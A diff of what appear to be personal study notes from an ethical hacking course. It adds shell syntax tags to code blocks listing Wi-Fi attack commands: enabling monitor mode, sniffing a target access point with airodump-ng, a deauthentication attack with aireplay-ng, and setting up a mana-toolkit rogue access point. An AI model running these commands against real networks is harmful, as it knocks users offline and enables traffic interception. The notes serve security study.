@@ -4,7 +4,7 @@ https://www.udemy.com/learn-ethical-hacking-from-scratch/learn/v4/t/lecture/5305
 
 ## monitor mode method 1
 
-```
+```sh
 # stop interface
 ifconfig wlan0 down
 # start interface
@@ -26,7 +26,7 @@ if airmon-ng does not work, you can enable monitor mode by trying
 
 # method 2
 
-```
+```sh
 iwconfig wlan0 down
 iwconfig wlan0 mode monitor
 iwconfig wlan0 up
@@ -34,7 +34,7 @@ iwconfig
 ```
 
 # method 3
-```
+```sh
 airmon-ng check kill # shut down processes that may interfere
 iwconfig wlan 0 down
 airmon-ng start wlan0
@@ -42,20 +42,20 @@ airmon-ng start wlan0
 
 # packet sniffing
 
-```
+```sh
 airodump-ng wlan0mon
 airodump-ng --channel 11 --bssid <macaddroftargetap> --write test-tempestad wlan0mon
 ```
 
 
 # deauth attack
-```
+```sh
 aireplay-ng --deauth 1000 -a <bssid> -c <client_mac_addr> wlan0mon
 ```
 
 ## honeypot
 
-```
+```sh
 apt-get install mana-toolkit
 # ensure config below has correct interfaces listed, update SSID if needed
 /etc/mana-toolkit/hostapd-mana.conf
